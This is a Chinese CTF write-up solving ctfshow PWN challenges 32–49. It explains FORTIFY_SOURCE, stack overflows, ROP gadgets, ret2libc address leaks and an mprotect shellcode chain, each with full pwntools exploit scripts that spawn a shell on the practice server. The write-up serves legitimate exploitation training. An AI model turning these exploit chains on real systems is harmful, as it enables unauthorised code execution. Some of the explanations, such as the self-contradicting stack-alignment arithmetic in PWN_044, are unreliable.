main已经把一些参数给定义了比如argv数组，第一个参数argv[1]被赋给v4，v4作中介把数值传递给了buf1，之后程序将v4[10]数组内容赋值给buf1[10]，接着通过strcpy函数，把字符串“CTFshowPWN”复制/赋值给buf2，printf打印buf1、buf2的当前的字符串内容，最后fget读取_bss_start的11个字符给buf1，打印buf1和num的信息，最后通过if判断argc是否大于4(默认情况下argc是等于1的，因为argv[0]必定存在，我们输入一个参数，argc就会等于2，依次递推)，大于4就进入undefined函数内\n因为本题目FORTIFY_SOURCE没有开启，代表我们启动函数直接输入4个参数(这时argc=5 \u0026gt; 4，为什么五个？因为你输入的4个+argc[0] = 5)就行了，而且这4个参数没有长度限制，如果开启FORTIFY_SOURCE就不好说了，因为开启了之后，由于程序存在strcpy和memcpy函数会检测长度，如果长度超过了限制，可能会使程序抛出异常而退出执行。\nPWN_033 题目：FORTIFY_SOURCE=1：\n启用 Fortify 功能的基本级别。 在编译时进行一些安全检查，如缓冲区边界检查、格式化字符串检查等。 在运行时进行某些检查，如检测函数返回值和大小的一致性。 如果检测到潜在的安全问题，会触发运行时错误，并终止程序执行。 PWN_033\nIDAx64分析：\nFORTIFY_SOURCE被打开了，代码和PWN_032几乎一样的，memcpy和strcpy这两个函数被替换成了__mencpy_chk和__strcpy__chk安全函数，可以看到这两个函数相比前两个函数只是加上了11LL这个参数加以限制，因为buf1和buf2在声明的时候的长度就是11，所以程序为了防止溢出，使用后两个函数加上这两个数组的长度加以限制以防溢出。\n但这不妨碍我们拿flag啊，只要运行./pwnme时输入的字符总长度不超过11就好：\n1 2 # argv[1] 长度≤10，argv[3] ≤11，总参数≥5 $./pwnme \u0026#34;short\u0026#34; \u0026#34;a\u0026#34; \u0026#34;5\u0026#34; \u0026#34;d\u0026#34; \u0026#34;e\u0026#34; PWN_034 题目：FORTIFY_SOURCE=2：\n启用 Fortify 功能的高级级别。 包括基本级别的安全检查，并添加了更多的检查。 在编译时进行更严格的检查，如更精确的缓冲区边界检查。 提供更丰富的编译器警告和错误信息。\nIDA分析，题目描述也说了该程序包括基本级别的安全检查，并添加了更多的检查。 在编译时进行更严格的检查，如更精确的缓冲区边界检查。 提供更丰富的编译器警告和错误信息。 使用ida64反编译的加过略微与前两道题目有所不同，大部分还是一样的，还是把危险函数替换成了安全函数。如下：\n大致能看出原函数是什么吧，这里就不多解释了\u0026hellip;\n# 格式化函数与解题操作说明 __printf__chk 函数与 printf 的区别在于：不能使用 %x$n 不连续地打印，也就是说如果要使用 %3$n，则必须同时使用 %1$n 和 %2$n。在使用 %n 的时候会做一些检查。 这涉及到格式化字符串漏洞，但本题不涉及此漏洞，所以对本道题几乎没有阻碍。后续我们还是通过 SSH 连接后运行文件，输入 4 个长度为 1 的参数，不出意外就能拿到 flag！\n栈溢出 PWN_035 题目：正式开始栈溢出了，先来一个最最最最简单的吧\n用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接\n1 ssh ctfshow@题目地址 -p题目端口号 **不是nc连接 **\n专用虚拟机镜像，全套在这里，提取码show\nPWN_035\nchecksec一下：\n没开canary保护，对应了本章主题——栈溢出。\nIDA分析：\n跟进函数：\n由此可知：ctfshow函数存在栈溢出漏洞，超过104字节就会发生栈溢出；\n对于SIGSEGV函数，当栈溢出触发 SIGSEGV 时，sigsegv_handler 函数会被调用，然后触发函数内部——fprintf打印出flag字符串，也正好对应了fget函数读取的flag值。\n栈溢出会破坏栈上的 “返回地址”“栈帧信息” 或其他关键内存结构，最终引发非法内存访问（比如函数返回时跳转到无效地址），触发 SIGSEGV 信号。\n所以说我们只要在运行的时候给程序打入超过104个的字符串就好，可以是105个“a”。\n/bin/sh地址的跳转利用 相较于32位程序，64 位程序调用函数需满足 栈对齐，因此构造 payload 时需注意：\n在实际解题中，ret 地址需要针对当前题目动态获取，用 ROPgadget 工具直接搜索程序中的 ret 指令（最常用）：\n1 ROPgadget --binary ./pwn | grep ret PWN_036 题目：存在后门函数，如何利用？ PWN_036\n非常不安全！！！！没有canary保护。可以用ret2shellcode、ret2libc。\n这题开始怪怪的，找不到/bin/sh的后门，sigsegv_handler 函数没有我们想要的flag，不过在左边函数目录看到熟悉的故人——get_flag函数，直接跟进看看：\n可以看到下面的fgets读取和返回的printf(s)打印函数，输出flag字符串，主函数没有引用它啊，怎么办？我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag。（可以用ret2shellcode、ret2libc）\nmain函数的突破点在这：\n没开canary保护，s数组可存储大小范围是36，超过了就覆盖返回地址了。\ngets 读取函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。\n安全性来看一般都会用fgets函数，搭配FORTIFY 缓冲区边界检查来提高程序自身安全性。\nexp：\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * context(arch = \u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39;,log_level = \u0026#39;debug\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;, 28297) elf = ELF(\u0026#39;./pwn\u0026#39;) get_flag_addr = elf.sym[\u0026#39;get_flag\u0026#39;] payload =\u0026#39;A\u0026#39; * 44 + p32(get_flag_addr) io.sendline(payload) #远程发送 io.interactive() #开启shell交互模式（类似终端） 这里的44个‘a’是0x28 + 4 ，0x28（十进制 40）是缓冲区到 ebp（栈基址寄存器）的距离，+4 是覆盖 ebp 本身（32 位程序中寄存器占 4 字节），总共 44 字节后，后续数据才能覆盖函数的 “返回地址”，从而跳转到 get_flag 函数。当然你可以用cyclic(0x28 + 4)，产生44字节的垃圾值。\nPWN_037 题目：32位的 system(“/bin/sh”) 后门函数给你。 PWN_037\nchecksec发现是有无栈溢出保护的，关了canary。\nIDA分析：\n可以发现main函数没有什么可以利用的，但是在函数目录可以看到有个backdoor的函数有猫腻\u0026hellip;.\n这个函数居然有/bin/sh！！！！！\n跟进ctfshow函数：\n有read读取函数，那我们可以以此为注入点，用垃圾值0x12+4先覆盖函数变量和寄存器ebp本身，然后再上传一个后门函数的地址。\nexp：\n1 2 3 4 5 6 7 8 9 from pwn import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28229) elf = ELF(\u0026#39;./pwn\u0026#39;) backdoor = elf.sym[\u0026#39;backdoor\u0026#39;] #后门函数的地址 payload = cyclic(0x12 + 4) + p32(backdoor) io.sendline(payload) io.recv() io.interactive() 脚本exp万岁。\nPWN_038 题目：64位的 system(“/bin/sh”) 后门函数给你。\nchecksec：\n没开canary保护，开NX保护（不能ret2shellcode）\nbuf数组距离ebp寄存器为0xAh，加上本身寄存器ebp的8字节。\n跟进backdoor函数看到/bin/sh，本题思路和上题PWN_037一样，只不过架构变成64位而已。\n64 位程序调用 system 需考虑堆栈平衡，本质是 64 位 ABI 对 “栈对齐” 的硬性要求—— 若不满足，函数执行时访问栈内存会崩溃；而 32 位 ABI 无此要求，仅需调用后清理参数栈即可，因此无需额外关注平衡。\n所以说exp需要考虑到堆栈平衡加上ret返回地址：\n在实际解题中，ret 地址需要针对当前题目动态获取，常用方法：\n工具查找：用 ROPgadget 工具直接搜索程序中的 ret 指令（最常用）：\n1 ROPgadget --binary ./pwn | grep ret exp：\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * context.log_level = \u0026#39;debug\u0026#39; #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;, 28147) elf = ELF(\u0026#39;./pwn\u0026#39;) backdoor = elf.sym[\u0026#39;backdoor\u0026#39;] ret = 0x400287 # 0x0000000000400287 : ret payload = cyclic(0xA+8) + p64(ret) + p64(backdoor) io.sendline(payload) io.recv() io.interactive() PWN_039 题目：32位的 system(); \u0026ldquo;/bin/sh\u0026rdquo;。 PWN_039\nchecksec一下：\n可以看到没开启canary、PIE保护的，存在可利用栈溢出漏洞的可能。\nIDA：\n跟进ctfshow函数发现栈溢出：\n可以读取50个字符给buf，但buf容量只有14，所以超过14就会造成栈溢出。\n接着在函数目录看到hint函数有猫腻：\n那么大致的exp思路就来了：也就是先cyclic函数生成垃圾值覆盖局部变量和ebp寄存器本身；但是只有system函数和/bin/sh，却没有system(“/bin/sh”);的后门，所以我们只能构造出来。\n在编写exp时，因为程序是32位，所以说不用去考虑它的堆栈平衡：\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * context.log_level = \u0026#39;debug\u0026#39; #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28216) elf = ELF(\u0026#39;./pwn\u0026#39;) system = elf.sym[\u0026#39;system\u0026#39;] bin_sh = 0x8048750 payload = \u0026#39;a\u0026#39;*(0x12+4) + p32(system) + p32(0) + p32(bin_sh) io.sendline(payload) io.recv() io.interactive() 这里的p32(0)等于4字节，可以用四个a或者cyclic(4)代替也行，这时32位下system函数的返回地址占位符，然后就到执行/bin/sh，那就是跳转到它的地址：\n这样子我们就构造出system(\u0026quot;/bin/sh\u0026quot;);了，然后进入交互模式获得flag。\n这题主要考察我们对于函数的构造以及函数地址的拼接、栈的结构组成。需要多看看我的PWN-2啊。。。。\nPWN_040 题目：64位的 system(); \u0026ldquo;/bin/sh\u0026rdquo;。\nIDA64位分析，跟进ctfshow函数：\nchecksec看到未打开canary保护，而且在ctfshow函数这发现有栈溢出。\n跟进hint函数，发现后门。\n用ROPgadget命令查询ret地址：\n1 ROPgadget --binary ./pwn | grep ret 查询/bin/sh的地址：\nexp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * context.log_level = \u0026#39;debug\u0026#39; #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28194) elf = ELF(\u0026#39;./pwn\u0026#39;) system = elf.sym[\u0026#39;system\u0026#39;] bin_sh = 0x400808 pop_rdi = 0x4007e3 # 0x00000000004007e3 : pop rdi ; ret ret = 0x4004fe # 0x00000000004004fe : ret payload = \u0026#39;a\u0026#39;*(0xA+8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system) io.sendline(payload) io.recv() io.interactive() 欸为什么exp的payload中的参数不太一样？\n32位和64位可执行程序的参数传递顺序 即使思路一样但架构不一样，在写payload的时候注入地址的顺序也是不一样的：\n32 位程序（PWN039）：32 位程序中，函数参数通过栈传递。在 PWN039 里，system函数地址紧跟在填充数据之后，这是因为溢出后直接覆盖返回地址为system函数地址，让程序执行system函数。在payload = 'a'*(0x12 + 4) + p32(system) + p32(0) + p32(bin_sh)中，'a'*(0x12 + 4)用于填充缓冲区并覆盖原返回地址，p32(system)将返回地址修改为system函数地址 ，p32(0)是为了满足栈结构，作为system函数执行后的返回地址（实际执行中并不重要，可随意填充 4 字节），p32(bin_sh)则是system函数的参数，即/bin/sh字符串的地址。这样的顺序符合 32 位程序通过栈传参和控制程序执行流的特点。 64 位程序（PWN40）：64 位程序的函数调用规则有所不同，前 6 个参数优先通过寄存器传递，其中第一个参数存放在rdi寄存器。在 PWN40 中，payload = 'a'*(0xA + 8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system) ，'a'*(0xA + 8)用于填充缓冲区和覆盖原返回地址；p64(pop_rdi)将pop_rdi指令地址放入栈中，执行pop_rdi指令时，会把紧跟其后的p64(bin_sh)中的/bin/sh地址弹出到rdi寄存器，作为system函数的第一个参数；p64(ret)用于栈对齐（64 位程序调用函数前需要保证栈 16 字节对齐，ret指令可调整栈指针）；最后p64(system)将system函数地址放入栈中，当程序执行到这里时，会跳转到system函数执行，此时rdi寄存器中已正确设置了参数/bin/sh的地址。 PWN_041 题目： 32位的 system(); 但是没\u0026quot;/bin/sh\u0026quot; ，好像有其他的可以替代。 PWN_041\nchecksec一下，然后IDA分析\n不能用ret2shellcode了。\n这里和上题差不多，找一下/bin/sh：\n找不到，但找到sh：\n/bin/sh和sh的核心区别 关键场景：能否替代取决于「调用函数的要求」\nPWN 中最常用的是通过 execve、system 函数执行 Shell（如构造 execve(\u0026quot;/bin/sh\u0026quot;, NULL, NULL) 获得交互权限），此外也可能涉及 system 函数，两者对参数的要求不同：\n场景 1：execve 函数（必须用绝对路径，sh 不可替代 /bin/sh）\nexecve 是 Linux 系统调用，作用是加载并执行新程序，其第一个参数必须是程序的绝对路径（或相对路径，但绝对路径是 PWN 中的常规选择），否则会报错「No such file or directory」。\n正确用法：execve(\u0026quot;/bin/sh\u0026quot;, ...)（系统直接定位到 /bin/sh，执行成功）。 错误用法：execve(\u0026quot;sh\u0026quot;, ...)（系统不知道 sh 在哪里，会遍历 $PATH 查找，但 execve 不支持通过 $PATH 解析命令名，直接失败）。 因此，在构造 execve 调用时，只能用 /bin/sh，不能用 sh。\n场景 2：system 函数（sh 和 /bin/sh 效果一致，可替代）\nsystem 函数的底层逻辑是「调用 /bin/sh -c 来执行参数中的命令」，其参数支持「命令名」或「绝对路径」：\n若传 system(\u0026quot;sh\u0026quot;)：system 会自动通过 $PATH 找到 sh（即 /bin/sh），等价于执行 /bin/sh -c sh，最终启动 Shell。 若传 system(\u0026quot;/bin/sh\u0026quot;)：等价于执行 /bin/sh -c /bin/sh，同样启动 Shell。 因此，在使用 system 函数时，sh 和 /bin/sh 效果完全一致，可以互相替代。\n特殊情况：环境变量 $PATH 被篡改（sh 可能失效，/bin/sh 更可靠）\n虽然多数情况下 $PATH 包含 /bin，但如果目标程序运行时篡改了 $PATH（如删除 /bin 目录），此时：\n用 sh 会因 $PATH 中找不到 sh 而失败； 用 /bin/sh 因是绝对路径，不受 $PATH 影响，依然能成功执行。 PWN 利用中为了「兼容性和稳定性」，即使是 system 函数，也更推荐写 /bin/sh 而非 sh（避免因环境变量异常导致利用失败）。\n这里跟进hint函数：\n发现这有现成的system函数，也就是说可以调用sh去进行提权。\n知道了sh地址是0x80487BA，就可以写exp了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28261) elf = ELF(\u0026#39;./pwn\u0026#39;) system = elf.sym[\u0026#39;system\u0026#39;] sh = 0x80487BA payload =cyclic(0x12+4) + p32(system) + p32(0) + p32(sh) io.sendline(payload) io.recv() io.interactive() PWN_042 题目：64位的 system(); 但是没\u0026quot;/bin/sh\u0026quot; ，好像有其他的可以替代。 PWN_042\n来看IDA64位分析：\nchecksec：\n在跟进hint函数也是如此，和PWN_041一样的，这次程序是64位，在exp编写上有所不同，需要pop_rdi：ret、ret的地址：\nret：0x40053e\npop_rdi：0x400843\n再找sh的地址吧：\nexp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28281) elf = ELF(\u0026#39;./pwn\u0026#39;) system = elf.sym[\u0026#39;system\u0026#39;] sh = 0x400872 ret = 0x40053e pop_rdi = 0x400843 payload =cyclic(0xA+8) + p64(pop_rdi) + p64(sh) + p64(ret) + p64(system) io.sendline(payload) io.recv() io.interactive() flag就不给了，因为靶机给的flag是动态的。\nPWN_043 题目：32位的 system(); 但是好像没\u0026quot;/bin/sh\u0026quot; 上面的办法不行了，想想办法。 PWN_043\nIDA32位跟进ctfshow函数：\ngets函数很危险的，一般都用fgets，用这个必溢出的好吧\u0026hellip;\u0026hellip;\n跟进hint函数：\n我们发现了system函数，但却不提供sh、/bin/sh给我们，只能利用gets函数。（gets函数进行读入数据，它可以无限读取到内存，不会判断上限，可以包含空格，以回车结束读取。所以这里就存在了明显的溢出）\n那大致的exp思路来了；先用cyclic产生垃圾值填充缓冲区和ebp本身，出现栈溢出后，将返回值覆盖为gets函数地址，加上ebx寄存器弹栈，gets函数读取数据，把我们所给的/bin/sh字符串写入这个内存里面，再次利用栈溢出，将返回地址覆盖为 system 函数的地址，使得 gets 执行完后，程序自动跳转到 system 执行，执行 system(\u0026quot;/bin/sh\u0026quot;) 获取 shell。\n这个内存去哪找？\n在bss字段（未初始化字段）找到了buf2变量：\n查询pop_ebx的地址\nexp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from pwn import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28152) elf = ELF(\u0026#39;./pwn\u0026#39;) system = elf.sym[\u0026#39;system\u0026#39;] gets = elf.sym[\u0026#39;gets\u0026#39;] pop_ebx = 0x8048409 buf2 = elf.sym[\u0026#39;buf2\u0026#39;] payload =cyclic(0x6C+4) + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system) + p32(0) + p32(buf2) io.sendline(payload) io.sendline(\u0026#34;/bin/sh\u0026#34;) io.recv() io.interactive() 这里有个疑问点就是为什么要用buf2内存变量呢？我直接调用system函数后再注入/bin/sh不就好了吗？这显然不行，因为此时的/bin/sh是一个普通的字符串，并没有分配地址，可执行程序的PIE和ASLR保护机制会让布局发生随机化改变，你给的字符串没地址，而system函数需要接受地址才能执行，而非直接注入无地址的纯字符串，buf2是bss字段的全局变量，地址固定，能给/bin/sh一个固定地址，让system精准找到它并执行。\nPWN_044 题目：64位的 system(); 但是好像没\u0026quot;/bin/sh\u0026quot; 上面的办法不行了，想想办法。 PWN_044\nIDA分析：\n和上一题区别是参数传递，64位的前6参数是靠寄存器rdi传递的。查询pop rdi；ret汇编命令的地址：\npop rdi ; ret：0x4007f3\nret：0x4004fe\n那exp大致不变，主要是payload吧：\n1 2 3 4 5 6 7 ... payload = cyclic(0xA+8) + p64(pop_rdi) + p64(buf2) + p64(gets) + p64(pop_rdi) + p64(buf2) + p64(ret) + p64(system) ... 可以发现这是错误的，进入不了交互，错就错在ret，这里不需要进行手动调栈堆平衡：\ngets 执行完后的总偏移是 44 字节（36+8）。\n后续执行 pop_rdi（8 字节）+ buf2 地址（8 字节）后，总偏移变为 44+8+8=60 字节。\n60 字节 ÷ 16 字节 = 3 余 12？不对 —— 此时调用 system 前，rsp 指向 system 函数的地址，而 60 + 8（system 地址本身）= 68 字节，68 ÷ 16 = 4 余 4？这显然不对。\n正确理解：不用纠结静态数字，而是要看到 gets 的执行引入了一次 “额外的栈弹出”（8 字节），恰好抵消了部分偏移的 “非对齐量”，使得最终调用 system 时，rsp 刚好落在 16 字节对齐的地址上 —— 这是动态执行中栈自然调整的结果，而非静态计算的总和。\n在 64 位 PWN 题中，“动态对齐” 是否需要加 ret，核心看 “中间是否有函数执行并自动调整栈指针”。\n正确的exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from pwn import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28244) elf = ELF(\u0026#39;./pwn\u0026#39;) system = elf.sym[\u0026#39;system\u0026#39;] gets = elf.sym[\u0026#39;gets\u0026#39;] pop_rdi = 0x4007f3 buf2 = elf.sym[\u0026#39;buf2\u0026#39;] payload = cyclic(0xA+8) + p64(pop_rdi) + p64(buf2) + p64(gets) + p64(pop_rdi) + p64(buf2) + p64(system) io.sendline(payload) io.sendline(\u0026#34;/bin/sh\u0026#34;) io.recv() io.interactive() PWN_045 题目：32位 无 system 无 \u0026ldquo;/bin/sh\u0026rdquo;。 PWN_045\nchecksec一下：\n32位关闭栈保护关闭PIE。\nIDA分析main：\n跟进ctfshow函数：\n还是明显的溢出漏洞了，只是其中的偏移变了，大差不差，现在我们关心的是如何去找到我们所需要的东西呢？现在既没有system，也没有“/bin/sh”\n思路：地址随机化+NX保护禁用ret2shellcode，那就是暗示我用ret2libc咯，用LibcSearcher获取当前libc版本，利用write泄露出write本身函数地址，再获取程序中因开启NX保护时地址随机化的write虚拟地址，两个地址相减得到地址偏移量，接着就能反推出system、/bin/sh的真实地址了。在此之前要记得先填充好变量的缓冲区。\n上半部分exp:\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28307) elf = ELF(\u0026#39;./pwn\u0026#39;) main = elf.sym[\u0026#39;main\u0026#39;] write_got = elf.got[\u0026#39;write\u0026#39;] write_plt = elf.plt[\u0026#39;write\u0026#39;] payload = cyclic(0x6b+4) + p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4) io.recvuntil(\u0026#39;O.o?\u0026#39;) #等程序发送这字符串再发送第一份payload io.sendline(payload) 这时候已经把write函数地址泄露出来了，不过看到这里比较懵逼哈，payload为什么要上传这么多，直接调用write函数不行了吗？还要got、plt啥的（堆plt、got不熟悉的可以看回PWN-1中plt和got表的讲解）。让我给你细分一下：先调用write_plt，这指write函数的执行入口，告诉write我要使用你了，调用write后，会从栈上读取这个地址作为下一条指令的位置。这里指定 main 函数，是为了让程序在泄露地址后回到主函数，继续接收我们的第二次payload（用于后续调用 system 获取 shell），避免程序直接退出。第一次payload是获得write地址，第二次payload是执行system函数。\n接着到p32(1) + p32(write_got) + p32(4)：write 函数的三个参数：\n32 位程序中参数通过栈从右往左传递，因此栈上顺序为：fd → buf → n，也就是 write(1, write_got, 4)\n来下半部分exp:\n1 2 3 4 5 6 7 8 9 libc = LibcSearcher(\u0026#39;write\u0026#39;,write) #用LibcSearcher查询write对应的libc当前版本 libc_base = write - libc.dump(\u0026#39;write\u0026#39;) system = libc_base + libc.dump(\u0026#39;system\u0026#39;) bin_sh = libc_base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) payload = cyclic(0x6b+4) + p32(system) + p32(main) + p32(bin_sh) io.sendline(payload) io.recv() io.interactive() write = u32(io.recvuntil(\u0026rsquo;\\xf7\u0026rsquo;)[-4:])这一段比较长，做过之前题目对此有点印象，不应该是write = u32(io.recv(4))？\n核心原因是程序输出中存在干扰信息，导致无法直接读取到纯净的 4 字节地址，你执行一下程序就知道了，会有“O.o?”冒出来，这是干扰。\nio.recv(4) 是有局限性的，io.recv(4) 的作用是从程序输出中读取固定的 4 字节数据，但它有一个严格前提：程序必须只输出我们需要的 4 字节地址，没有任何多余内容（如提示文本、换行符、其他数据等）。此时recv直接读取4个字节，那就会读到O.o?的字节导致错误。\nrecvuntil('\\xf7')[-4:]：适用于程序输出存在干扰信息，且地址以 \\xf7 开头（32 位 libc 典型特征）的场景，通过特征定位 + 截取来提取正确地址。\n1 write = u64(io.recvuntil(b\u0026#39;\\x7f\u0026#39;)[-8:]) PWN_046（待定） 题目：64位 无 system 无 \u0026ldquo;/bin/sh\u0026rdquo;。 PWN_046\nIDA64分析：\n和上题思路差不多，改下参数就好，还有这个O.o?干扰你\u0026hellip;\u0026hellip;\n题目有点怪我先跳一跳，\n待定\nPWN_047 题目：ez ret2libc PWN_047\n就提示用ret2libc\nchecksec一下：\nIDA32位分析：\n运行程序：\n一上来就给了几个函数的地址，目前来看还没给出system的地址。\n跟进ctfshow函数还发现了gets函数：\n那就是通过栈溢出ret2libc来搞flag咯。\n在data字段还找到了/bin/sh：\n你有无发现：这个/bin/sh的地址就是gift\n那思路就是用puts进行泄露地址，得出偏移量再反推出system函数的真实地址\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28146) elf = ELF(\u0026#39;./pwn\u0026#39;) puts_got = elf.got[\u0026#39;puts\u0026#39;] puts_plt = elf.plt[\u0026#39;puts\u0026#39;] io.recvuntil(\u0026#34;puts:\u0026#34;) puts = eval(io.recvuntil(\u0026#34;\\n\u0026#34;,drop = True)) io.recvuntil(\u0026#34;gift:\u0026#34;) bin_sh = eval(io.recvuntil(\u0026#34;\\n\u0026#34;,drop = True)) #只读取地址，丢弃换行\\n的16进制字符串 libc = LibcSearcher(\u0026#39;puts\u0026#39;,puts) libc_base = puts - libc.dump(\u0026#39;puts\u0026#39;) system = libc_base + libc.dump(\u0026#39;system\u0026#39;) payload = cyclic(0x9c+4) + p32(system) + p32(0) + p32(bin_sh) io.sendline(payload) io.recv() io.interactive() PWN_048 题目：没有write了，试试用puts吧，更简单了呢。 PWN_048\nIDA32分析：\n跟进ctfshow函数：\n编写exp泄露puts的地址，得出偏移量区反推出system函数、/bin/sh的地址。\nexp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28189) elf = ELF(\u0026#39;./pwn\u0026#39;) main = elf.sym[\u0026#39;main\u0026#39;] puts_got = elf.got[\u0026#39;puts\u0026#39;] puts_plt = elf.plt[\u0026#39;puts\u0026#39;] payload = cyclic(0x6b+4) + p32(puts_plt) + p32(main) + p32(puts_got) io.recvuntil(\u0026#39;O.o?\u0026#39;) io.sendline(payload) puts = u32(io.recvuntil(\u0026#39;\\xf7\u0026#39;)[-4:]) #\\xf7 是程序输出中 write、puts 地址的标志性末尾字节。通过 recvuntil(\u0026#39;\\xf7\u0026#39;)，可以确保：读取到的内容 “包含 puts 地址的完整有效部分”（因为只有遇到 \\xf7 才会停止读取）。避免因程序输出存在其他干扰数据，导致 recv(4) 提前截取到错误的 4 字节。 print(hex(puts)) #可要可不要，只是方便检查 libc = LibcSearcher(\u0026#39;puts\u0026#39;,puts) libc_base = puts - libc.dump(\u0026#39;puts\u0026#39;) system = libc_base + libc.dump(\u0026#39;system\u0026#39;) bin_sh = libc_base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) payload = cyclic(0x6b+4) + p32(system) + p32(main) + p32(bin_sh) io.sendline(payload) io.recv() io.interactive() PWN_049 题目：静态编译？或许你可以找找mprotect函数。 PWN_049\nchecksec一下，没开canary、PIE、NX保护。\nIDA32：\n可以看到有非常多的函数，这就是静态编译。\n跟进ctfshow函数，看到read有栈溢出漏洞。\n找mprotect函数：\nMprotect函数 1 2 3 4 5 6 7 8 9 unsigned int __cdecl mprotect(const void *a1, size_t a2, int a3) { unsigned int result; // eax result = sys_mprotect(a1, a2, a3); if ( result \u0026gt;= 0xFFFFF001 ) return _syscall_error(); return result; } 代码解析： 函数参数： a1：要修改权限的内存起始地址（需页对齐）。 a2：内存区域的长度（字节数）。 a3：新的保护权限（如 PROT_READ、PROT_WRITE、PROT_EXEC 、PROT_NONE、prot=7）。prot可以取这几个值，并且可以用“|”将几个属性合起来使用。 核心逻辑： 调用 sys_mprotect：这是真正的内核级系统调用（用户态到内核态的桥梁），负责实际执行内存权限修改操作。 错误处理：sys_mprotect 的返回值若 \u0026gt;= 0xFFFFF001（这是 Unix/Linux 中系统调用错误码的典型范围，通常表示操作失败），则通过 _syscall_error() 处理错误（例如设置 errno 并返回错误码）。 成功返回：若系统调用成功，直接返回 sys_mprotect 的结果（通常为 0）。 这段代码是用户态 mprotect 函数的封装，本质是通过调用内核的 sys_mprotect 系统调用来实现功能，最终目的是：\n允许进程动态修改某段内存的读写执行权限（例如将只读内存改为可写，或给数据段添加执行权限），常用于内存管理、动态代码加载、漏洞利用等场景。\n简单说，这段代码是用户程序与内核交互的 “中间层”，让开发者可以通过简单的函数调用修改内存权限，而无需直接操作内核接口。\n那么我们可以利用它修改内存的权限为可读可写可执 行（RWX），然后我们就可以往栈上写入shellcode、执行，最后获取shell。\n在构造 payload 前，需先确定 3 个核心要素：目标内存地址、mprotect 参数、控制寄存器的 Gadget，这些是 payload 的 “积木”。\n我们要选择的内存地址是0x80DA000，等会？这不是bss段吧？\n选择原因：mprotect 要求操作的内存地址必须 页对齐（即地址是 4KB/0x1000 的整数倍，32 位系统默认页大小为 4KB）（64位就是8kb咯）。 程序 BSS 段起始地址（如 0x80DB320）不满足页对齐，而 0x80DA000 是内存页的起始地址（末尾三位为 000，符合 4KB 对齐），且属于程序可访问的内存区域。 然后就是mprotect函数参数\n1 mprotect(const void *a1, size_t a2, int a3) a1是start起始地址，也就是0x80DA000；a2是长度范围，这里选择0x1000，足够我们容纳shellcode大小了；a3是prot，也就是修改成的权限范围，这里直接改为RWX，也就是简写0x7。\n最后是控制函数参数的工具——关键gadgets\n32位程序用栈传参的，这里的mprotect函数有三个参数，且调用后需继续控制流程，因此需要 pop ebx ; pop esi ; pop ebp ; ret 这样的 Gadget，用ROPgadget指令查询地址：\npop ebx ; pop esi ; pop ebp ; ret的地址是0x080a019b\nexp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from pwn import * context.log_level = \u0026#39;debug\u0026#39; io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28132) elf = ELF(\u0026#39;./pwn\u0026#39;) mprotect = elf.sym[\u0026#39;mprotect\u0026#39;] read_address = elf.sym[\u0026#39;read\u0026#39;] pop_ebx_esi_ebp_ret = 0x80a019b start = 0x80DA000 size = 0x1000 proc = 0x7 payload = cyclic(0x12+4) + p32(mprotect) payload += p32(pop_ebx_esi_ebp_ret) + p32(start) + p32(size) + p32(proc) payload += p32(read_address) payload += p32(pop_ebx_esi_ebp_ret) + p32(0) + p32(start) + p32(size) + p32(start) io.sendline(payload) shellcode = asm(shellcraft.sh()) io.sendline(shellcode) io.recv() io.interactive() 对于payload：\n1 2 3 4 5 payload = cyclic(0x12+4) + p32(mprotect) payload += p32(pop_ebx_esi_ebp_ret) + p32(start) + p32(size) + p32(proc) payload += p32(read_address) payload += p32(pop_ebx_esi_ebp_ret) + p32(0) + p32(start) + p32(size) + p32(start) 